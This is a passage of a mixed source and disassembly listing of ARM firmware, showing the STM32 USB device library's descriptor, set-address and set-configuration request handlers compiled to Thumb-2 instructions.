 800ba82:	2300      	movs	r3, #0
 800ba84:	60fb      	str	r3, [r7, #12]
  uint8_t err = 0U;
 800ba86:	2300      	movs	r3, #0
 800ba88:	72fb      	strb	r3, [r7, #11]

  switch (req->wValue >> 8)
 800ba8a:	683b      	ldr	r3, [r7, #0]
 800ba8c:	885b      	ldrh	r3, [r3, #2]
 800ba8e:	0a1b      	lsrs	r3, r3, #8
 800ba90:	b29b      	uxth	r3, r3
 800ba92:	3b01      	subs	r3, #1
 800ba94:	2b0e      	cmp	r3, #14
 800ba96:	f200 8152 	bhi.w	800bd3e <USBD_GetDescriptor+0x2ca>
 800ba9a:	a201      	add	r2, pc, #4	; (adr r2, 800baa0 <USBD_GetDescriptor+0x2c>)
 800ba9c:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800baa0:	0800bb11 	.word	0x0800bb11
 800baa4:	0800bb29 	.word	0x0800bb29
 800baa8:	0800bb69 	.word	0x0800bb69
 800baac:	0800bd3f 	.word	0x0800bd3f
 800bab0:	0800bd3f 	.word	0x0800bd3f
 800bab4:	0800bcdf 	.word	0x0800bcdf
 800bab8:	0800bd0b 	.word	0x0800bd0b
 800babc:	0800bd3f 	.word	0x0800bd3f
 800bac0:	0800bd3f 	.word	0x0800bd3f
 800bac4:	0800bd3f 	.word	0x0800bd3f
 800bac8:	0800bd3f 	.word	0x0800bd3f
 800bacc:	0800bd3f 	.word	0x0800bd3f
 800bad0:	0800bd3f 	.word	0x0800bd3f
 800bad4:	0800bd3f 	.word	0x0800bd3f
 800bad8:	0800badd 	.word	0x0800badd
  {
#if ((USBD_LPM_ENABLED == 1U) || (USBD_CLASS_BOS_ENABLED == 1U))
    case USB_DESC_TYPE_BOS:
      if (pdev->pDesc->GetBOSDescriptor != NULL)
 800badc:	687b      	ldr	r3, [r7, #4]
 800bade:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bae2:	69db      	ldr	r3, [r3, #28]
 800bae4:	2b00      	cmp	r3, #0
 800bae6:	d00b      	beq.n	800bb00 <USBD_GetDescriptor+0x8c>
      {
        pbuf = pdev->pDesc->GetBOSDescriptor(pdev->dev_speed, &len);
 800bae8:	687b      	ldr	r3, [r7, #4]
 800baea:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800baee:	69db      	ldr	r3, [r3, #28]
 800baf0:	687a      	ldr	r2, [r7, #4]
 800baf2:	7c12      	ldrb	r2, [r2, #16]
 800baf4:	f107 0108 	add.w	r1, r7, #8
 800baf8:	4610      	mov	r0, r2
 800bafa:	4798      	blx	r3
 800bafc:	60f8      	str	r0, [r7, #12]
      else
      {
        USBD_CtlError(pdev, req);
        err++;
      }
      break;
 800bafe:	e126      	b.n	800bd4e <USBD_GetDescriptor+0x2da>
        USBD_CtlError(pdev, req);
 800bb00:	6839      	ldr	r1, [r7, #0]
 800bb02:	6878      	ldr	r0, [r7, #4]
 800bb04:	f000 fb27 	bl	800c156 <USBD_CtlError>
        err++;
 800bb08:	7afb      	ldrb	r3, [r7, #11]
 800bb0a:	3301      	adds	r3, #1
 800bb0c:	72fb      	strb	r3, [r7, #11]
      break;
 800bb0e:	e11e      	b.n	800bd4e <USBD_GetDescriptor+0x2da>
#endif /* (USBD_LPM_ENABLED == 1U) || (USBD_CLASS_BOS_ENABLED == 1U) */
    case USB_DESC_TYPE_DEVICE:
      pbuf = pdev->pDesc->GetDeviceDescriptor(pdev->dev_speed, &len);
 800bb10:	687b      	ldr	r3, [r7, #4]
 800bb12:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bb16:	681b      	ldr	r3, [r3, #0]
 800bb18:	687a      	ldr	r2, [r7, #4]
 800bb1a:	7c12      	ldrb	r2, [r2, #16]
 800bb1c:	f107 0108 	add.w	r1, r7, #8
 800bb20:	4610      	mov	r0, r2
 800bb22:	4798      	blx	r3
 800bb24:	60f8      	str	r0, [r7, #12]
      break;
 800bb26:	e112      	b.n	800bd4e <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_CONFIGURATION:
      if (pdev->dev_speed == USBD_SPEED_HIGH)
 800bb28:	687b      	ldr	r3, [r7, #4]
 800bb2a:	7c1b      	ldrb	r3, [r3, #16]
 800bb2c:	2b00      	cmp	r3, #0
 800bb2e:	d10d      	bne.n	800bb4c <USBD_GetDescriptor+0xd8>
          pbuf   = (uint8_t *)USBD_CMPSIT.GetHSConfigDescriptor(&len);
        }
        else
#endif /* USE_USBD_COMPOSITE */
        {
          pbuf = (uint8_t *)pdev->pClass[0]->GetHSConfigDescriptor(&len);
 800bb30:	687b      	ldr	r3, [r7, #4]
 800bb32:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bb36:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 800bb38:	f107 0208 	add.w	r2, r7, #8
 800bb3c:	4610      	mov	r0, r2
 800bb3e:	4798      	blx	r3
 800bb40:	60f8      	str	r0, [r7, #12]
        }
        pbuf[1] = USB_DESC_TYPE_CONFIGURATION;
 800bb42:	68fb      	ldr	r3, [r7, #12]
 800bb44:	3301      	adds	r3, #1
 800bb46:	2202      	movs	r2, #2
 800bb48:	701a      	strb	r2, [r3, #0]
        {
          pbuf   = (uint8_t *)pdev->pClass[0]->GetFSConfigDescriptor(&len);
        }
        pbuf[1] = USB_DESC_TYPE_CONFIGURATION;
      }
      break;
 800bb4a:	e100      	b.n	800bd4e <USBD_GetDescriptor+0x2da>
          pbuf   = (uint8_t *)pdev->pClass[0]->GetFSConfigDescriptor(&len);
 800bb4c:	687b      	ldr	r3, [r7, #4]
 800bb4e:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bb52:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800bb54:	f107 0208 	add.w	r2, r7, #8
 800bb58:	4610      	mov	r0, r2
 800bb5a:	4798      	blx	r3
 800bb5c:	60f8      	str	r0, [r7, #12]
        pbuf[1] = USB_DESC_TYPE_CONFIGURATION;
 800bb5e:	68fb      	ldr	r3, [r7, #12]
 800bb60:	3301      	adds	r3, #1
 800bb62:	2202      	movs	r2, #2
 800bb64:	701a      	strb	r2, [r3, #0]
      break;
 800bb66:	e0f2      	b.n	800bd4e <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_STRING:
      switch ((uint8_t)(req->wValue))
 800bb68:	683b      	ldr	r3, [r7, #0]
 800bb6a:	885b      	ldrh	r3, [r3, #2]
 800bb6c:	b2db      	uxtb	r3, r3
 800bb6e:	2b05      	cmp	r3, #5
 800bb70:	f200 80ac 	bhi.w	800bccc <USBD_GetDescriptor+0x258>
 800bb74:	a201      	add	r2, pc, #4	; (adr r2, 800bb7c <USBD_GetDescriptor+0x108>)
 800bb76:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800bb7a:	bf00      	nop
 800bb7c:	0800bb95 	.word	0x0800bb95
 800bb80:	0800bbc9 	.word	0x0800bbc9
 800bb84:	0800bbfd 	.word	0x0800bbfd
 800bb88:	0800bc31 	.word	0x0800bc31
 800bb8c:	0800bc65 	.word	0x0800bc65
 800bb90:	0800bc99 	.word	0x0800bc99
      {
        case USBD_IDX_LANGID_STR:
          if (pdev->pDesc->GetLangIDStrDescriptor != NULL)
 800bb94:	687b      	ldr	r3, [r7, #4]
 800bb96:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bb9a:	685b      	ldr	r3, [r3, #4]
 800bb9c:	2b00      	cmp	r3, #0
 800bb9e:	d00b      	beq.n	800bbb8 <USBD_GetDescriptor+0x144>
          {
            pbuf = pdev->pDesc->GetLangIDStrDescriptor(pdev->dev_speed, &len);
 800bba0:	687b      	ldr	r3, [r7, #4]
 800bba2:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bba6:	685b      	ldr	r3, [r3, #4]
 800bba8:	687a      	ldr	r2, [r7, #4]
 800bbaa:	7c12      	ldrb	r2, [r2, #16]
 800bbac:	f107 0108 	add.w	r1, r7, #8
 800bbb0:	4610      	mov	r0, r2
 800bbb2:	4798      	blx	r3
 800bbb4:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bbb6:	e091      	b.n	800bcdc <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bbb8:	6839      	ldr	r1, [r7, #0]
 800bbba:	6878      	ldr	r0, [r7, #4]
 800bbbc:	f000 facb 	bl	800c156 <USBD_CtlError>
            err++;
 800bbc0:	7afb      	ldrb	r3, [r7, #11]
 800bbc2:	3301      	adds	r3, #1
 800bbc4:	72fb      	strb	r3, [r7, #11]
          break;
 800bbc6:	e089      	b.n	800bcdc <USBD_GetDescriptor+0x268>

        case USBD_IDX_MFC_STR:
          if (pdev->pDesc->GetManufacturerStrDescriptor != NULL)
 800bbc8:	687b      	ldr	r3, [r7, #4]
 800bbca:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bbce:	689b      	ldr	r3, [r3, #8]
 800bbd0:	2b00      	cmp	r3, #0
 800bbd2:	d00b      	beq.n	800bbec <USBD_GetDescriptor+0x178>
          {
            pbuf = pdev->pDesc->GetManufacturerStrDescriptor(pdev->dev_speed, &len);
 800bbd4:	687b      	ldr	r3, [r7, #4]
 800bbd6:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bbda:	689b      	ldr	r3, [r3, #8]
 800bbdc:	687a      	ldr	r2, [r7, #4]
 800bbde:	7c12      	ldrb	r2, [r2, #16]
 800bbe0:	f107 0108 	add.w	r1, r7, #8
 800bbe4:	4610      	mov	r0, r2
 800bbe6:	4798      	blx	r3
 800bbe8:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bbea:	e077      	b.n	800bcdc <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bbec:	6839      	ldr	r1, [r7, #0]
 800bbee:	6878      	ldr	r0, [r7, #4]
 800bbf0:	f000 fab1 	bl	800c156 <USBD_CtlError>
            err++;
 800bbf4:	7afb      	ldrb	r3, [r7, #11]
 800bbf6:	3301      	adds	r3, #1
 800bbf8:	72fb      	strb	r3, [r7, #11]
          break;
 800bbfa:	e06f      	b.n	800bcdc <USBD_GetDescriptor+0x268>

        case USBD_IDX_PRODUCT_STR:
          if (pdev->pDesc->GetProductStrDescriptor != NULL)
 800bbfc:	687b      	ldr	r3, [r7, #4]
 800bbfe:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc02:	68db      	ldr	r3, [r3, #12]
 800bc04:	2b00      	cmp	r3, #0
 800bc06:	d00b      	beq.n	800bc20 <USBD_GetDescriptor+0x1ac>
          {
            pbuf = pdev->pDesc->GetProductStrDescriptor(pdev->dev_speed, &len);
 800bc08:	687b      	ldr	r3, [r7, #4]
 800bc0a:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc0e:	68db      	ldr	r3, [r3, #12]
 800bc10:	687a      	ldr	r2, [r7, #4]
 800bc12:	7c12      	ldrb	r2, [r2, #16]
 800bc14:	f107 0108 	add.w	r1, r7, #8
 800bc18:	4610      	mov	r0, r2
 800bc1a:	4798      	blx	r3
 800bc1c:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bc1e:	e05d      	b.n	800bcdc <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bc20:	6839      	ldr	r1, [r7, #0]
 800bc22:	6878      	ldr	r0, [r7, #4]
 800bc24:	f000 fa97 	bl	800c156 <USBD_CtlError>
            err++;
 800bc28:	7afb      	ldrb	r3, [r7, #11]
 800bc2a:	3301      	adds	r3, #1
 800bc2c:	72fb      	strb	r3, [r7, #11]
          break;
 800bc2e:	e055      	b.n	800bcdc <USBD_GetDescriptor+0x268>

        case USBD_IDX_SERIAL_STR:
          if (pdev->pDesc->GetSerialStrDescriptor != NULL)
 800bc30:	687b      	ldr	r3, [r7, #4]
 800bc32:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc36:	691b      	ldr	r3, [r3, #16]
 800bc38:	2b00      	cmp	r3, #0
 800bc3a:	d00b      	beq.n	800bc54 <USBD_GetDescriptor+0x1e0>
          {
            pbuf = pdev->pDesc->GetSerialStrDescriptor(pdev->dev_speed, &len);
 800bc3c:	687b      	ldr	r3, [r7, #4]
 800bc3e:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc42:	691b      	ldr	r3, [r3, #16]
 800bc44:	687a      	ldr	r2, [r7, #4]
 800bc46:	7c12      	ldrb	r2, [r2, #16]
 800bc48:	f107 0108 	add.w	r1, r7, #8
 800bc4c:	4610      	mov	r0, r2
 800bc4e:	4798      	blx	r3
 800bc50:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bc52:	e043      	b.n	800bcdc <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bc54:	6839      	ldr	r1, [r7, #0]
 800bc56:	6878      	ldr	r0, [r7, #4]
 800bc58:	f000 fa7d 	bl	800c156 <USBD_CtlError>
            err++;
 800bc5c:	7afb      	ldrb	r3, [r7, #11]
 800bc5e:	3301      	adds	r3, #1
 800bc60:	72fb      	strb	r3, [r7, #11]
          break;
 800bc62:	e03b      	b.n	800bcdc <USBD_GetDescriptor+0x268>

        case USBD_IDX_CONFIG_STR:
          if (pdev->pDesc->GetConfigurationStrDescriptor != NULL)
 800bc64:	687b      	ldr	r3, [r7, #4]
 800bc66:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc6a:	695b      	ldr	r3, [r3, #20]
 800bc6c:	2b00      	cmp	r3, #0
 800bc6e:	d00b      	beq.n	800bc88 <USBD_GetDescriptor+0x214>
          {
            pbuf = pdev->pDesc->GetConfigurationStrDescriptor(pdev->dev_speed, &len);
 800bc70:	687b      	ldr	r3, [r7, #4]
 800bc72:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc76:	695b      	ldr	r3, [r3, #20]
 800bc78:	687a      	ldr	r2, [r7, #4]
 800bc7a:	7c12      	ldrb	r2, [r2, #16]
 800bc7c:	f107 0108 	add.w	r1, r7, #8
 800bc80:	4610      	mov	r0, r2
 800bc82:	4798      	blx	r3
 800bc84:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bc86:	e029      	b.n	800bcdc <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bc88:	6839      	ldr	r1, [r7, #0]
 800bc8a:	6878      	ldr	r0, [r7, #4]
 800bc8c:	f000 fa63 	bl	800c156 <USBD_CtlError>
            err++;
 800bc90:	7afb      	ldrb	r3, [r7, #11]
 800bc92:	3301      	adds	r3, #1
 800bc94:	72fb      	strb	r3, [r7, #11]
          break;
 800bc96:	e021      	b.n	800bcdc <USBD_GetDescriptor+0x268>

        case USBD_IDX_INTERFACE_STR:
          if (pdev->pDesc->GetInterfaceStrDescriptor != NULL)
 800bc98:	687b      	ldr	r3, [r7, #4]
 800bc9a:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc9e:	699b      	ldr	r3, [r3, #24]
 800bca0:	2b00      	cmp	r3, #0
 800bca2:	d00b      	beq.n	800bcbc <USBD_GetDescriptor+0x248>
          {
            pbuf = pdev->pDesc->GetInterfaceStrDescriptor(pdev->dev_speed, &len);
 800bca4:	687b      	ldr	r3, [r7, #4]
 800bca6:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bcaa:	699b      	ldr	r3, [r3, #24]
 800bcac:	687a      	ldr	r2, [r7, #4]
 800bcae:	7c12      	ldrb	r2, [r2, #16]
 800bcb0:	f107 0108 	add.w	r1, r7, #8
 800bcb4:	4610      	mov	r0, r2
 800bcb6:	4798      	blx	r3
 800bcb8:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bcba:	e00f      	b.n	800bcdc <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bcbc:	6839      	ldr	r1, [r7, #0]
 800bcbe:	6878      	ldr	r0, [r7, #4]
 800bcc0:	f000 fa49 	bl	800c156 <USBD_CtlError>
            err++;
 800bcc4:	7afb      	ldrb	r3, [r7, #11]
 800bcc6:	3301      	adds	r3, #1
 800bcc8:	72fb      	strb	r3, [r7, #11]
          break;
 800bcca:	e007      	b.n	800bcdc <USBD_GetDescriptor+0x268>
            err++;
          }
#endif /* USBD_SUPPORT_USER_STRING_DESC  */

#if ((USBD_CLASS_USER_STRING_DESC == 0U) && (USBD_SUPPORT_USER_STRING_DESC == 0U))
          USBD_CtlError(pdev, req);
 800bccc:	6839      	ldr	r1, [r7, #0]
 800bcce:	6878      	ldr	r0, [r7, #4]
 800bcd0:	f000 fa41 	bl	800c156 <USBD_CtlError>
          err++;
 800bcd4:	7afb      	ldrb	r3, [r7, #11]
 800bcd6:	3301      	adds	r3, #1
 800bcd8:	72fb      	strb	r3, [r7, #11]
#endif /* (USBD_CLASS_USER_STRING_DESC == 0U) && (USBD_SUPPORT_USER_STRING_DESC == 0U) */
          break;
 800bcda:	bf00      	nop
      }
      break;
 800bcdc:	e037      	b.n	800bd4e <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_DEVICE_QUALIFIER:
      if (pdev->dev_speed == USBD_SPEED_HIGH)
 800bcde:	687b      	ldr	r3, [r7, #4]
 800bce0:	7c1b      	ldrb	r3, [r3, #16]
 800bce2:	2b00      	cmp	r3, #0
 800bce4:	d109      	bne.n	800bcfa <USBD_GetDescriptor+0x286>
          pbuf = (uint8_t *)USBD_CMPSIT.GetDeviceQualifierDescriptor(&len);
        }
        else
#endif /* USE_USBD_COMPOSITE */
        {
          pbuf = (uint8_t *)pdev->pClass[0]->GetDeviceQualifierDescriptor(&len);
 800bce6:	687b      	ldr	r3, [r7, #4]
 800bce8:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bcec:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 800bcee:	f107 0208 	add.w	r2, r7, #8
 800bcf2:	4610      	mov	r0, r2
 800bcf4:	4798      	blx	r3
 800bcf6:	60f8      	str	r0, [r7, #12]
      else
      {
        USBD_CtlError(pdev, req);
        err++;
      }
      break;
 800bcf8:	e029      	b.n	800bd4e <USBD_GetDescriptor+0x2da>
        USBD_CtlError(pdev, req);
 800bcfa:	6839      	ldr	r1, [r7, #0]
 800bcfc:	6878      	ldr	r0, [r7, #4]
 800bcfe:	f000 fa2a 	bl	800c156 <USBD_CtlError>
        err++;
 800bd02:	7afb      	ldrb	r3, [r7, #11]
 800bd04:	3301      	adds	r3, #1
 800bd06:	72fb      	strb	r3, [r7, #11]
      break;
 800bd08:	e021      	b.n	800bd4e <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_OTHER_SPEED_CONFIGURATION:
      if (pdev->dev_speed == USBD_SPEED_HIGH)
 800bd0a:	687b      	ldr	r3, [r7, #4]
 800bd0c:	7c1b      	ldrb	r3, [r3, #16]
 800bd0e:	2b00      	cmp	r3, #0
 800bd10:	d10d      	bne.n	800bd2e <USBD_GetDescriptor+0x2ba>
          pbuf = (uint8_t *)USBD_CMPSIT.GetOtherSpeedConfigDescriptor(&len);
        }
        else
#endif /* USE_USBD_COMPOSITE */
        {
          pbuf = (uint8_t *)pdev->pClass[0]->GetOtherSpeedConfigDescriptor(&len);
 800bd12:	687b      	ldr	r3, [r7, #4]
 800bd14:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bd18:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 800bd1a:	f107 0208 	add.w	r2, r7, #8
 800bd1e:	4610      	mov	r0, r2
 800bd20:	4798      	blx	r3
 800bd22:	60f8      	str	r0, [r7, #12]
        }
        pbuf[1] = USB_DESC_TYPE_OTHER_SPEED_CONFIGURATION;
 800bd24:	68fb      	ldr	r3, [r7, #12]
 800bd26:	3301      	adds	r3, #1
 800bd28:	2207      	movs	r2, #7
 800bd2a:	701a      	strb	r2, [r3, #0]
      else
      {
        USBD_CtlError(pdev, req);
        err++;
      }
      break;
 800bd2c:	e00f      	b.n	800bd4e <USBD_GetDescriptor+0x2da>
        USBD_CtlError(pdev, req);
 800bd2e:	6839      	ldr	r1, [r7, #0]
 800bd30:	6878      	ldr	r0, [r7, #4]
 800bd32:	f000 fa10 	bl	800c156 <USBD_CtlError>
        err++;
 800bd36:	7afb      	ldrb	r3, [r7, #11]
 800bd38:	3301      	adds	r3, #1
 800bd3a:	72fb      	strb	r3, [r7, #11]
      break;
 800bd3c:	e007      	b.n	800bd4e <USBD_GetDescriptor+0x2da>

    default:
      USBD_CtlError(pdev, req);
 800bd3e:	6839      	ldr	r1, [r7, #0]
 800bd40:	6878      	ldr	r0, [r7, #4]
 800bd42:	f000 fa08 	bl	800c156 <USBD_CtlError>
      err++;
 800bd46:	7afb      	ldrb	r3, [r7, #11]
 800bd48:	3301      	adds	r3, #1
 800bd4a:	72fb      	strb	r3, [r7, #11]
      break;
 800bd4c:	bf00      	nop
  }

  if (err != 0U)
 800bd4e:	7afb      	ldrb	r3, [r7, #11]
 800bd50:	2b00      	cmp	r3, #0
 800bd52:	d11e      	bne.n	800bd92 <USBD_GetDescriptor+0x31e>
  {
    return;
  }

  if (req->wLength != 0U)
 800bd54:	683b      	ldr	r3, [r7, #0]
 800bd56:	88db      	ldrh	r3, [r3, #6]
 800bd58:	2b00      	cmp	r3, #0
 800bd5a:	d016      	beq.n	800bd8a <USBD_GetDescriptor+0x316>
  {
    if (len != 0U)
 800bd5c:	893b      	ldrh	r3, [r7, #8]
 800bd5e:	2b00      	cmp	r3, #0
 800bd60:	d00e      	beq.n	800bd80 <USBD_GetDescriptor+0x30c>
    {
      len = MIN(len, req->wLength);
 800bd62:	683b      	ldr	r3, [r7, #0]
 800bd64:	88da      	ldrh	r2, [r3, #6]
 800bd66:	893b      	ldrh	r3, [r7, #8]
 800bd68:	4293      	cmp	r3, r2
 800bd6a:	bf28      	it	cs
 800bd6c:	4613      	movcs	r3, r2
 800bd6e:	b29b      	uxth	r3, r3
 800bd70:	813b      	strh	r3, [r7, #8]
      (void)USBD_CtlSendData(pdev, pbuf, len);
 800bd72:	893b      	ldrh	r3, [r7, #8]
 800bd74:	461a      	mov	r2, r3
 800bd76:	68f9      	ldr	r1, [r7, #12]
 800bd78:	6878      	ldr	r0, [r7, #4]
 800bd7a:	f000 fa5d 	bl	800c238 <USBD_CtlSendData>
 800bd7e:	e009      	b.n	800bd94 <USBD_GetDescriptor+0x320>
    }
    else
    {
      USBD_CtlError(pdev, req);
 800bd80:	6839      	ldr	r1, [r7, #0]
 800bd82:	6878      	ldr	r0, [r7, #4]
 800bd84:	f000 f9e7 	bl	800c156 <USBD_CtlError>
 800bd88:	e004      	b.n	800bd94 <USBD_GetDescriptor+0x320>
    }
  }
  else
  {
    (void)USBD_CtlSendStatus(pdev);
 800bd8a:	6878      	ldr	r0, [r7, #4]
 800bd8c:	f000 faae 	bl	800c2ec <USBD_CtlSendStatus>
 800bd90:	e000      	b.n	800bd94 <USBD_GetDescriptor+0x320>
    return;
 800bd92:	bf00      	nop
  }
}
 800bd94:	3710      	adds	r7, #16
 800bd96:	46bd      	mov	sp, r7
 800bd98:	bd80      	pop	{r7, pc}
 800bd9a:	bf00      	nop

0800bd9c <USBD_SetAddress>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_SetAddress(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800bd9c:	b580      	push	{r7, lr}
 800bd9e:	b084      	sub	sp, #16
 800bda0:	af00      	add	r7, sp, #0
 800bda2:	6078      	str	r0, [r7, #4]
 800bda4:	6039      	str	r1, [r7, #0]
  uint8_t  dev_addr;

  if ((req->wIndex == 0U) && (req->wLength == 0U) && (req->wValue < 128U))
 800bda6:	683b      	ldr	r3, [r7, #0]
 800bda8:	889b      	ldrh	r3, [r3, #4]
 800bdaa:	2b00      	cmp	r3, #0
 800bdac:	d131      	bne.n	800be12 <USBD_SetAddress+0x76>
 800bdae:	683b      	ldr	r3, [r7, #0]
 800bdb0:	88db      	ldrh	r3, [r3, #6]
 800bdb2:	2b00      	cmp	r3, #0
 800bdb4:	d12d      	bne.n	800be12 <USBD_SetAddress+0x76>
 800bdb6:	683b      	ldr	r3, [r7, #0]
 800bdb8:	885b      	ldrh	r3, [r3, #2]
 800bdba:	2b7f      	cmp	r3, #127	; 0x7f
 800bdbc:	d829      	bhi.n	800be12 <USBD_SetAddress+0x76>
  {
    dev_addr = (uint8_t)(req->wValue) & 0x7FU;
 800bdbe:	683b      	ldr	r3, [r7, #0]
 800bdc0:	885b      	ldrh	r3, [r3, #2]
 800bdc2:	b2db      	uxtb	r3, r3
 800bdc4:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800bdc8:	73fb      	strb	r3, [r7, #15]

    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800bdca:	687b      	ldr	r3, [r7, #4]
 800bdcc:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800bdd0:	b2db      	uxtb	r3, r3
 800bdd2:	2b03      	cmp	r3, #3
 800bdd4:	d104      	bne.n	800bde0 <USBD_SetAddress+0x44>
    {
      USBD_CtlError(pdev, req);
 800bdd6:	6839      	ldr	r1, [r7, #0]
 800bdd8:	6878      	ldr	r0, [r7, #4]
 800bdda:	f000 f9bc 	bl	800c156 <USBD_CtlError>
    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800bdde:	e01d      	b.n	800be1c <USBD_SetAddress+0x80>
    }
    else
    {
      pdev->dev_address = dev_addr;
 800bde0:	687b      	ldr	r3, [r7, #4]
 800bde2:	7bfa      	ldrb	r2, [r7, #15]
 800bde4:	f883 229e 	strb.w	r2, [r3, #670]	; 0x29e
      (void)USBD_LL_SetUSBAddress(pdev, dev_addr);
 800bde8:	7bfb      	ldrb	r3, [r7, #15]
 800bdea:	4619      	mov	r1, r3
 800bdec:	6878      	ldr	r0, [r7, #4]
 800bdee:	f000 ffbf 	bl	800cd70 <USBD_LL_SetUSBAddress>
      (void)USBD_CtlSendStatus(pdev);
 800bdf2:	6878      	ldr	r0, [r7, #4]
 800bdf4:	f000 fa7a 	bl	800c2ec <USBD_CtlSendStatus>

      if (dev_addr != 0U)
 800bdf8:	7bfb      	ldrb	r3, [r7, #15]
 800bdfa:	2b00      	cmp	r3, #0
 800bdfc:	d004      	beq.n	800be08 <USBD_SetAddress+0x6c>
      {
        pdev->dev_state = USBD_STATE_ADDRESSED;
 800bdfe:	687b      	ldr	r3, [r7, #4]
 800be00:	2202      	movs	r2, #2
 800be02:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800be06:	e009      	b.n	800be1c <USBD_SetAddress+0x80>
      }
      else
      {
        pdev->dev_state = USBD_STATE_DEFAULT;
 800be08:	687b      	ldr	r3, [r7, #4]
 800be0a:	2201      	movs	r2, #1
 800be0c:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800be10:	e004      	b.n	800be1c <USBD_SetAddress+0x80>
      }
    }
  }
  else
  {
    USBD_CtlError(pdev, req);
 800be12:	6839      	ldr	r1, [r7, #0]
 800be14:	6878      	ldr	r0, [r7, #4]
 800be16:	f000 f99e 	bl	800c156 <USBD_CtlError>
  }
}
 800be1a:	bf00      	nop
 800be1c:	bf00      	nop
 800be1e:	3710      	adds	r7, #16
 800be20:	46bd      	mov	sp, r7
 800be22:	bd80      	pop	{r7, pc}

0800be24 <USBD_SetConfig>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static USBD_StatusTypeDef USBD_SetConfig(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800be24:	b580      	push	{r7, lr}
 800be26:	b084      	sub	sp, #16
 800be28:	af00      	add	r7, sp, #0
 800be2a:	6078      	str	r0, [r7, #4]
 800be2c:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret = USBD_OK;
 800be2e:	2300      	movs	r3, #0
 800be30:	73fb      	strb	r3, [r7, #15]
  static uint8_t cfgidx;

  cfgidx = (uint8_t)(req->wValue);
 800be32:	683b      	ldr	r3, [r7, #0]
 800be34:	885b      	ldrh	r3, [r3, #2]
 800be36:	b2da      	uxtb	r2, r3
 800be38:	4b4e      	ldr	r3, [pc, #312]	; (800bf74 <USBD_SetConfig+0x150>)
 800be3a:	701a      	strb	r2, [r3, #0]

  if (cfgidx > USBD_MAX_NUM_CONFIGURATION)
 800be3c:	4b4d      	ldr	r3, [pc, #308]	; (800bf74 <USBD_SetConfig+0x150>)
 800be3e:	781b      	ldrb	r3, [r3, #0]
 800be40:	2b01      	cmp	r3, #1
 800be42:	d905      	bls.n	800be50 <USBD_SetConfig+0x2c>
  {
    USBD_CtlError(pdev, req);
 800be44:	6839      	ldr	r1, [r7, #0]
 800be46:	6878      	ldr	r0, [r7, #4]
 800be48:	f000 f985 	bl	800c156 <USBD_CtlError>
    return USBD_FAIL;
 800be4c:	2303      	movs	r3, #3
 800be4e:	e08c      	b.n	800bf6a <USBD_SetConfig+0x146>
  }

  switch (pdev->dev_state)
 800be50:	687b      	ldr	r3, [r7, #4]
 800be52:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800be56:	b2db      	uxtb	r3, r3
